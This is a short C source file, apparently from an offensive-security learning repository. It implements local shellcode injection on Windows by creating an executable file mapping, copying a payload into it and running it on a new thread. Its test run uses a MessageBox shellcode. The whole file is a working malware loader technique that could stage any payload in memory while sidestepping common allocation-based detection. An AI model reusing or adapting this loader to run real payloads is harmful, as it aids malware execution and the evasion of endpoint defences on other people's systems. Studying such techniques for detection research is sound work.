/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : base payload injection using mapping method
 */

#include "mapinject.h"

/**
 * Payload injection using mapping technique
 * 
 * @param pPayload => ptr to payload
 * @param sPayloadSize => size of payload
 * @param pAddress => base address of written payload.
 */
BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pAddress){
    BOOL   STATE       = TRUE;
    HANDLE hFile       = NULL;
    PVOID  pMapAddress = NULL;

    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if(hFile == NULL){
        printf("[!] Error calling CreateFileMappingW function with error %d \n", GetLastError());
        STATE = FALSE; goto _EndFunc;
    }

    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    if(pMapAddress == NULL){
        printf("[!] Error calling MapViewOfFile with error : %d \n", GetLastError());
        STATE = FALSE; goto _EndFunc;
    }

    printf("[*] pMapAddres : 0x%p \n", pMapAddress);
    memcpy(pMapAddress, pPayload, sPayloadSize);
    printf("[*] Copied payload to 0x%p \n", pMapAddress);

_EndFunc:
    *pAddress = pMapAddress; //address of allocated payload.
    if(hFile){
        CloseHandle(hFile);
    }

    return STATE;
}

//test.
int main(){
    PVOID  pAddress = NULL;
    HANDLE hThread  = NULL;

    if(!LocalMapInject(MessageBoxAPayload, sizeof(MessageBoxAPayload), &pAddress)){
        return EXIT_FAILURE;
    }

    printf("Press <ENTER> to continue operation... \n");
    getchar();

    //creating thread to execute payload.
    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if(hThread != NULL){
        WaitForSingleObject(hThread, INFINITE);
        printf("[*] End.\n");
    }
    else{
        printf("[!] Error creating new thread for payload execution. \n");
        return EXIT_FAILURE;
    }

    printf("[#] Press <Enter> To Quit ... ");
	getchar();

    return EXIT_SUCCESS;
}